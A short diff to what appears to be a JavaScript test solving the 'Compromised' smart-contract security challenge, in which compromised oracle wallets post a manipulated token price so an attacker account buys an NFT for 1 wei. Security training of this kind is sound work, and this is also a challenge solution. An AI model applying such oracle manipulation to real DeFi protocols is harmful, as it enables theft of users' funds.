@@ -79,13 +79,13 @@ describe('Compromised challenge', function () {
         console.log(startPrice.toString())
 
         for (let i = 0; i < wallets.length; i++) {
-			await this.oracle.connect(wallets[i]).postPrice(tokenSymbol, 0);
+			await this.oracle.connect(wallets[i]).postPrice(tokenSymbol, 1);
         }
     
         console.log("price manipulated")
         const afterPrice = await this.oracle.getMedianPrice(tokenSymbol)
         console.log(afterPrice.toString())
-		const boughtNft = await this.exchange.connect(attacker).buyOne( { value: 0 });
+		const boughtNft = await this.exchange.connect(attacker).buyOne( { value: 1 });
         const tx = await boughtNft.wait()
         const tokenId = tx.events.find(item=>item.event=='TokenBought').args.tokenId.toString()
         console.log("Bought tokenId",tokenId)
